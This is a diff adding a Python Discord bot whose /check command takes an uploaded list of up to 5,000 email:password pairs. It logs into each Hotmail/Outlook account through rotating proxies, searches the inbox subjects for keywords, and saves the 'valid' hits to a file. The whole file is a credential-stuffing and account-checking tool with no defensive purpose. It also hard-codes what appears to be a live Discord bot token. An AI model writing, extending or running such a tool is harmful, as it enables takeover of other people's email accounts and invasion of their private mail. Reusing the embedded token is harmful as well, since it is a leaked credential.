@@ -1,0 +1,124 @@
+﻿# Discord Bot with Proxy Login
+
+
+import discord
+from discord.ext import commands
+import asyncio
+import requests
+from bs4 import BeautifulSoup
+import random
+
+
+# Bot configuration
+TOKEN = 'MTM3NDc3MDAwMDQ1MTIwNzQ0Mg.GE6Ezl.ZobCZGMNZhec6DA6cGSR_oqM4y18U9pRjv6as4'
+PREFIX = '/'
+
+
+bot = commands.Bot(command_prefix=PREFIX)
+
+
+# Function to read proxies from file
+def get_proxy():
+    with open('proxies.txt', 'r') as file:
+        proxies = file.read().splitlines()
+    return random.choice(proxies)
+
+
+# Function to login to Hotmail and check inbox
+async def check_inbox(username, password, proxy, keywords):
+    session = requests.Session()
+    session.proxies = {"http": proxy, "https": proxy}
+    
+    # Login to Hotmail
+    login_url = 'https://login.live.com/login.srf'
+    login_data = {
+        'login': username,
+        'passwd': password,
+        # Additional login parameters might be needed
+    }
+    response = session.post(login_url, data=login_data)
+    
+    # Check if login was successful
+    if 'Your account has been locked' in response.text:
+        return "Account locked"
+    
+    # Fetch inbox
+    inbox_url = 'https://outlook.live.com/mail/inbox'
+    response = session.get(inbox_url)
+    
+    soup = BeautifulSoup(response.text, 'html.parser')
+    emails = soup.find_all('div', {'class': 'msgItem'})
+    
+    results = {}
+    for keyword in keywords:
+        results[keyword] = False
+    
+    for email in emails:
+        subject = email.find('span', {'class': 'subject'}).text.lower()
+        for keyword in keywords:
+            if keyword.lower() in subject:
+                results[keyword] = True
+                break
+    
+    return results
+
+
+@bot.event
+async def on_ready():
+    print(f'Logged in as {bot.user.name}')
+
+
+@bot.command(name='check')
+async def check(ctx, attachment: discord.Attachment, *, keywords):
+    if not attachment.filename.endswith('.txt'):
+        await ctx.send("Please attach a .txt file with account credentials.")
+        return
+    
+    # Download the file
+    await attachment.save('accounts.txt')
+    
+    # Read accounts from file
+    with open('accounts.txt', 'r') as file:
+        accounts = file.read().splitlines()[:5000]  # Limit to 5000 accounts
+    
+    keywords_list = keywords.split(', ')
+    results = {}
+    
+    for account in accounts:
+        username, password = account.split(':')
+        proxy = get_proxy()
+        result = await check_inbox(username, password, proxy, keywords_list)
+        
+        for keyword, found in result.items():
+            if keyword not in results:
+                results[keyword] = []
+            if found:
+                results[keyword].append(username)
+    
+    # Format the UI-like output
+    ui_output = "```\n"
+    ui_output += "┌──────────────────────────────────────────────────────────────┐\n"
+    ui_output += "│                        Check Results                         │\n"
+    ui_output += "├──────────────────────────────────────────────────────────────┤\n"
+    for keyword, found_accounts in results.items():
+        ui_output += f"│ {keyword:<30} │ {'True' if found_accounts else 'False':<10} │\n"
+    ui_output += "└──────────────────────────────────────────────────────────────┘\n"
+    ui_output += "```"
+    
+    await ctx.send(ui_output)
+    
+    # Save valid accounts to file
+    with open('Valid.txt', 'w') as file:
+        for keyword, accounts in results.items():
+            if accounts:
+                file.write(f"{keyword}:\n")
+                for account in accounts:
+                    file.write(f"{account}\n")
+                file.write("\n")
+    
+    # Send DM to user
+    user = ctx.author
+    await user.send("The check process has finished. Results have been saved to 'Valid.txt'.")
+
+
+bot.run(TOKEN)
